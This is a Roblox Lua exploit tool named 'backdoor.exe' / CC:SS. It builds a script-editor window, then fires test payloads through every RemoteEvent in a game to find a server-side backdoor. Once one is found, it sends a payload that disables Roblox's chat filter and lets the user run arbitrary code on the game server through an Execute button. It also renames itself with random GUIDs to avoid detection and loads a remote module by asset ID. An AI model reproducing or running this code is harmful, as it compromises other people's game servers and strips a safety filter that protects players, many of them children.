--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

function createNotification(Title, Text, Duration)
    game.StarterGui:SetCore("SendNotification", {
        Title = Title,
        Text = Text,
        Duration = Duration
    }) 
end


local localPlayer = game:GetService("Players").LocalPlayer

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local TextLabel = Instance.new("TextLabel")
local close = Instance.new("ImageButton")
local Scroll = Instance.new("ScrollingFrame")
local CodeBox = Instance.new("TextBox")
local Comments_ = Instance.new("TextLabel")
local Globals_ = Instance.new("TextLabel")
local Keywords_ = Instance.new("TextLabel")
local Numbers_ = Instance.new("TextLabel")
local RemoteHighlight_ = Instance.new("TextLabel")
local Strings_ = Instance.new("TextLabel")
local Tokens_ = Instance.new("TextLabel")
local Hidden = Instance.new("TextBox")
local Lines = Instance.new("TextLabel")
local Execute = Instance.new("TextButton")
local Clear = Instance.new("TextButton")
local RE = Instance.new("TextButton")
local R6 = Instance.new("TextButton")
local localPlayer = game.Players.LocalPlayer
local randID = tostring(localPlayer.UserId * 2)..tostring(math.random(100000000,1000000000))

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Name = randID

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.169786096, 0, 0.193939388, 0)
Frame.Size = UDim2.new(0, 493, 0, 303)
Frame.Active = true
Frame.Draggable = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderSizePixel = 0
Frame_2.Size = UDim2.new(1, 0, 0.0821529776, 5)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(84, 41, 122)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(192, 125, 255))}
UIGradient.Parent = Frame_2

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.0362991281, 0, -0.100360118, 0)
TextLabel.Size = UDim2.new(0, 178, 0, 34)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "CC:SS"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 20.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

close.Name = "close"
close.Parent = Frame
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.926809311, 0, -0.00404314836, 0)
close.Size = UDim2.new(0, 35, 0, 35)
close.Image = "http://www.roblox.com/asset/?id=6031094678"

Scroll.Name = "Scroll"
Scroll.Parent = Frame
Scroll.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Scroll.BorderColor3 = Color3.fromRGB(0, 255, 115)
Scroll.BorderSizePixel = 0
Scroll.Position = UDim2.new(0.0373124145, 0, 0.151904315, 0)
Scroll.Size = UDim2.new(0, 456, 0, 203)
Scroll.ZIndex = 3
Scroll.BottomImage = "rbxassetid://148970562"
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
Scroll.MidImage = "rbxassetid://148970562"
Scroll.ScrollBarThickness = 3
Scroll.TopImage = "rbxassetid://148970562"
Scroll.AutomaticCanvasSize = Enum.AutomaticSize.XY

CodeBox.Name = "CodeBox"
CodeBox.Parent = Scroll
CodeBox.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
CodeBox.BackgroundTransparency = 1.000
CodeBox.BorderSizePixel = 0
CodeBox.Position = UDim2.new(0, 36, 0, 0)
CodeBox.Size = UDim2.new(0.874000013, 0, 1, 0)
CodeBox.ZIndex = 3
CodeBox.ClearTextOnFocus = false
CodeBox.Font = Enum.Font.Code
CodeBox.MultiLine = true
CodeBox.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
CodeBox.Text = ""
CodeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CodeBox.TextSize = 14.000
CodeBox.TextXAlignment = Enum.TextXAlignment.Left
CodeBox.TextYAlignment = Enum.TextYAlignment.Top
CodeBox.AutomaticSize = Enum.AutomaticSize.XY

Comments_.Name = "Comments_"
Comments_.Parent = CodeBox
Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments_.BackgroundTransparency = 1.000
Comments_.ClipsDescendants = true
Comments_.Size = UDim2.new(1, 0, 1, 0)
Comments_.ZIndex = 5
Comments_.Font = Enum.Font.Code
Comments_.Text = ""
Comments_.TextColor3 = Color3.fromRGB(86, 86, 86)
Comments_.TextSize = 14.000
Comments_.TextTransparency = 1.000
Comments_.TextXAlignment = Enum.TextXAlignment.Left
Comments_.TextYAlignment = Enum.TextYAlignment.Top

Globals_.Name = "Globals_"
Globals_.Parent = CodeBox
Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals_.BackgroundTransparency = 1.000
Globals_.ClipsDescendants = true
Globals_.Size = UDim2.new(1, 0, 1, 0)
Globals_.ZIndex = 5
Globals_.Font = Enum.Font.Code
Globals_.Text = ""
Globals_.TextColor3 = Color3.fromRGB(132, 214, 247)
Globals_.TextSize = 14.000
Globals_.TextXAlignment = Enum.TextXAlignment.Left
Globals_.TextYAlignment = Enum.TextYAlignment.Top

Keywords_.Name = "Keywords_"
Keywords_.Parent = CodeBox
Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords_.BackgroundTransparency = 1.000
Keywords_.ClipsDescendants = true
Keywords_.Size = UDim2.new(1, 0, 1, 0)
Keywords_.ZIndex = 5
Keywords_.Font = Enum.Font.Code
Keywords_.Text = ""
Keywords_.TextColor3 = Color3.fromRGB(248, 109, 124)
Keywords_.TextSize = 14.000
Keywords_.TextXAlignment = Enum.TextXAlignment.Left
Keywords_.TextYAlignment = Enum.TextYAlignment.Top

Numbers_.Name = "Numbers_"
Numbers_.Parent = CodeBox
Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers_.BackgroundTransparency = 1.000
Numbers_.ClipsDescendants = true
Numbers_.Size = UDim2.new(1, 0, 1, 0)
Numbers_.ZIndex = 4
Numbers_.Font = Enum.Font.Code
Numbers_.Text = ""
Numbers_.TextColor3 = Color3.fromRGB(255, 198, 0)
Numbers_.TextSize = 14.000
Numbers_.TextXAlignment = Enum.TextXAlignment.Left
Numbers_.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight_.Name = "RemoteHighlight_"
RemoteHighlight_.Parent = CodeBox
RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight_.BackgroundTransparency = 1.000
RemoteHighlight_.ClipsDescendants = true
RemoteHighlight_.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight_.ZIndex = 5
RemoteHighlight_.Font = Enum.Font.Code
RemoteHighlight_.Text = ""
RemoteHighlight_.TextColor3 = Color3.fromRGB(11, 255, 203)
RemoteHighlight_.TextSize = 14.000
RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top

Strings_.Name = "Strings_"
Strings_.Parent = CodeBox
Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings_.BackgroundTransparency = 1.000
Strings_.ClipsDescendants = true
Strings_.Size = UDim2.new(1, 0, 1, 0)
Strings_.ZIndex = 5
Strings_.Font = Enum.Font.Code
Strings_.Text = ""
Strings_.TextColor3 = Color3.fromRGB(173, 241, 149)
Strings_.TextSize = 14.000
Strings_.TextXAlignment = Enum.TextXAlignment.Left
Strings_.TextYAlignment = Enum.TextYAlignment.Top

Tokens_.Name = "Tokens_"
Tokens_.Parent = CodeBox
Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.BackgroundTransparency = 1.000
Tokens_.ClipsDescendants = true
Tokens_.Size = UDim2.new(1, 0, 1, 0)
Tokens_.ZIndex = 5
Tokens_.Font = Enum.Font.Code
Tokens_.Text = ""
Tokens_.TextColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.TextSize = 14.000
Tokens_.TextXAlignment = Enum.TextXAlignment.Left
Tokens_.TextYAlignment = Enum.TextYAlignment.Top

Hidden.Name = "Hidden"
Hidden.Parent = Scroll
Hidden.BackgroundColor3 = Color3.fromRGB(54, 154, 255)
Hidden.BackgroundTransparency = 1.000
Hidden.BorderColor3 = Color3.fromRGB(0, 85, 127)
Hidden.BorderSizePixel = 0
Hidden.ClipsDescendants = true
Hidden.Position = UDim2.new(0.0830000266, 0, 7.85827651e-05, 0)
Hidden.Size = UDim2.new(0.916999876, 0, -195.300003, 76999000)
Hidden.Visible = false
Hidden.ClearTextOnFocus = false
Hidden.Font = Enum.Font.Code
Hidden.MultiLine = true
Hidden.Text = ""
Hidden.TextColor3 = Color3.fromRGB(255, 255, 255)
Hidden.TextSize = 20.000
Hidden.TextWrapped = true
Hidden.TextXAlignment = Enum.TextXAlignment.Left
Hidden.TextYAlignment = Enum.TextYAlignment.Top

Lines.Name = "Lines"
Lines.Parent = Scroll
Lines.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Lines.BorderColor3 = Color3.fromRGB(20, 20, 20)
Lines.BorderSizePixel = 0
Lines.Size = UDim2.new(-0.00999999978, 30, 1, 0)
Lines.ZIndex = 4
Lines.Font = Enum.Font.Code
Lines.Text = "1"
Lines.TextColor3 = Color3.fromRGB(106, 106, 106)
Lines.TextSize = 14.000
Lines.TextYAlignment = Enum.TextYAlignment.Top
Lines.AutomaticSize = Enum.AutomaticSize.Y

Execute.Name = "Execute"
Execute.Parent = Frame
Execute.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.0365111567, 0, 0.851485193, 0)
Execute.Size = UDim2.new(0, 128, 0, 34)
Execute.Font = Enum.Font.Gotham
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 20.000

Clear.Name = "Clear"
Clear.Parent = Frame
Clear.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0.326572031, 0, 0.851485193, 0)
Clear.Size = UDim2.new(0, 128, 0, 34)
Clear.Font = Enum.Font.Gotham
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.TextSize = 20.000

RE.Name = "RE"
RE.Parent = Frame
RE.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
RE.BorderSizePixel = 0
RE.Position = UDim2.new(0.626774907, 0, 0.851485133, 0)
RE.Size = UDim2.new(0, 70, 0, 34)
RE.Font = Enum.Font.Gotham
RE.Text = "RE"
RE.TextColor3 = Color3.fromRGB(255, 255, 255)
RE.TextSize = 20.000

R6.Name = "R6"
R6.Parent = Frame
R6.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
R6.BorderSizePixel = 0
R6.Position = UDim2.new(0.819472671, 0, 0.851485133, 0)
R6.Size = UDim2.new(0, 70, 0, 34)
R6.Font = Enum.Font.Gotham
R6.Text = "R6"
R6.TextColor3 = Color3.fromRGB(255, 255, 255)
R6.TextSize = 20.000

-- Scripts:

close.MouseButton1Click:Connect(function()
    ScreenGui:Destroy() 
end)

Execute.MouseButton1Click:Connect(function()
    print(CodeBox.Text) 
end)

local function QKWTOMX_fake_script() -- Frame_2.LocalScript

	while wait() do
		for i=-1,1.1,0.13 do
			UIGradient.Offset = Vector2.new(i,0)
			wait()
		end
		UIGradient.Rotation = 180
		UIGradient.Offset = Vector2.new(-1,0)
		for i=-1,1.1,0.13 do
			UIGradient.Offset = Vector2.new(i,0)
			wait()
		end
		UIGradient.Rotation = 0
		UIGradient.Offset = Vector2.new(-1,0)
	end
end
coroutine.wrap(QKWTOMX_fake_script)()
local function FEVP_fake_script() -- Scroll.Highlight 
	local script = Instance.new('LocalScript', Scroll)

	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "load", "fire", "Fire", "johndoe", "die"}
	
	local Source = script.Parent.CodeBox
	local Lines = script.Parent.Lines
	
	local Highlight = function(string, keywords)
	    local K = {}
	    local S = string
	    local Token =
	    {
	        ["="] = true,
	        ["."] = true,
	        [","] = true,
	        ["("] = true,
	        [")"] = true,
	        ["["] = true,
	        ["]"] = true,
	        ["{"] = true,
	        ["}"] = true,
	        [":"] = true,
	        ["*"] = true,
	        ["/"] = true,
	        ["+"] = true,
	        ["-"] = true,
	        ["%"] = true,
			[";"] = true,
			["~"] = true
	    }
	    for i, v in pairs(keywords) do
	        K[v] = true
	    end
	    S = S:gsub(".", function(c)
	        if Token[c] ~= nil then
	            return "\32"
	        else
	            return c
	        end
	    end)
	    S = S:gsub("%S+", function(c)
	        if K[c] ~= nil then
	            return c
	        else
	            return (" "):rep(#c)
	        end
	    end)
	    return S
	end
	
	local hTokens = function(string)
	    local Token =
	    {
	        ["="] = true,
	        ["."] = true,
	        [","] = true,
	        ["("] = true,
	        [")"] = true,
	        ["["] = true,
	        ["]"] = true,
	        ["{"] = true,
	        ["}"] = true,
	        [":"] = true,
	        ["*"] = true,
	        ["/"] = true,
	        ["+"] = true,
	        ["-"] = true,
	        ["%"] = true,
			[";"] = true,
			["~"] = true
	    }
	    local A = ""
	    string:gsub(".", function(c)
	        if Token[c] ~= nil then
	            A = A .. c
	        elseif c == "\n" then
	            A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
	        else
	            A = A .. "\32"
	        end
	    end)
	    return A
	end
	
	local strings = function(string)
	    local highlight = ""
	    local quote = false
	    string:gsub(".", function(c)
	        if quote == false and c == "\"" then
	            quote = true
	        elseif quote == true and c == "\"" then
	            quote = false
	        end
	        if quote == false and c == "\"" then
	            highlight = highlight .. "\""
	        elseif c == "\n" then
	            highlight = highlight .. "\n"
			elseif c == "\t" then
			    highlight = highlight .. "\t"
	        elseif quote == true then
	            highlight = highlight .. c
	        elseif quote == false then
	            highlight = highlight .. "\32"
	        end
	    end)
	    return highlight
	end
	
	local comments = function(string)
	    local ret = ""
	    string:gsub("[^\r\n]+", function(c)
	        local comm = false
	        local i = 0
	        c:gsub(".", function(n)
	            i = i + 1
	            if c:sub(i, i + 1) == "--" then
	                comm = true
	            end
	            if comm == true then
	                ret = ret .. n
	            else
	                ret = ret .. "\32"
	            end
	        end)
	        ret = ret
	    end)
	    return ret
	end
	
	local numbers = function(string)
	    local A = ""
	    string:gsub(".", function(c)
	        if tonumber(c) ~= nil then
	            A = A .. c
	        elseif c == "\n" then
	            A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
	        else
	            A = A .. "\32"
	        end
	    end)
	    return A
	end
	
	local highlight_source = function(type)
		if type == "Text" then
			Source.Text = Source.Text:gsub("\13", "")
			Source.Text = Source.Text:gsub("\t", "      ")
			local s = Source.Text
			Source.Keywords_.Text = Highlight(s, lua_keywords)
			Source.Globals_.Text = Highlight(s, global_env)
			Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
			Lines.Text = ""
			for i = 1, lin do
				Lines.Text = Lines.Text .. i .. "\n"
			end
		end
	end
	
	highlight_source("Text")
	
	Source.Changed:Connect(highlight_source)
	while true do
		script.Name = game:GetService("HttpService"):GenerateGUID()
		wait(1)
	end
end
coroutine.wrap(FEVP_fake_script)()

local BackdoorUI = {
	attached = false,
	backdoorRemote = nil,
	scanning = false
}

local function changeUiState()
    createNotification("Backdoor found!", "A backdoor was found in this game therefore CC:SS was attached.", 5)
end
local function stringToInstance(str)
	 -- Credits to the DevForum
	local dir = str
	local segments = dir:split(".")
	local current = game
	for i, v in pairs(segments) do
		 current = current[v]
	end
	return current
end
local function check()
	
	if workspace:FindFirstChild(randID) then
		BackdoorUI.backdoorRemote = stringToInstance(workspace:FindFirstChild(randID).Value)
		
		-- Anti-Censoring
		BackdoorUI.backdoorRemote:FireServer("local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
		
		workspace:FindFirstChild(randID):Destroy()
		return true
	end
end

local function remoteCheck(rm)
	local fullName =  rm:GetFullName()

	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, localPlayer.Name) then return false end
	if rm:FindFirstChild("__FUNCTION") then return false end
	if rm.Parent == game:GetService("JointsService") then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end
	return true
	
end

local function scan()
	if BackdoorUI.scanning then return end
	if BackdoorUI.attached then changeUiState() end

	BackdoorUI.scanning = true

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then

			if remoteCheck(testRemote) then
				testRemote:FireServer(
					"i=Instance.new('StringValue',workspace) i.Name='"..
					randID.."' i.Value='"..testRemote:GetFullName().."'"
				)
			end

			if check() then
				changeUiState()
				return
			end
			game:GetService("RunService").Stepped:Wait()
		end
	end
	
	wait(1.5)
	if check() then
		changeUiState()
		return
	end
	
	BackdoorUI.scanning = false
end

scan()

local function executeScript(scrpt)
	if not scrpt then scrpt = CodeBox.Text end

	BackdoorUI.backdoorRemote:FireServer(scrpt)
end

-- Buttons
close.MouseButton1Click:Connect(function()
    ScreenGui:Destroy() 
end)

Clear.MouseButton1Click:Connect(function()
    CodeBox.Text = "" 
end)

Execute.MouseButton1Click:Connect(function()
    executeScript(CodeBox.Text)
end)

RE.MouseButton1Click:Connect(function()
    executeScript("game.Players['" .. localPlayer.Name .. "']:LoadCharacter()")
end)

R6.MouseButton1Click:Connect(function()
    executeScript("require(3041175937):r6('"..localPlayer.Name.."')") 
end)

return ScreenGui
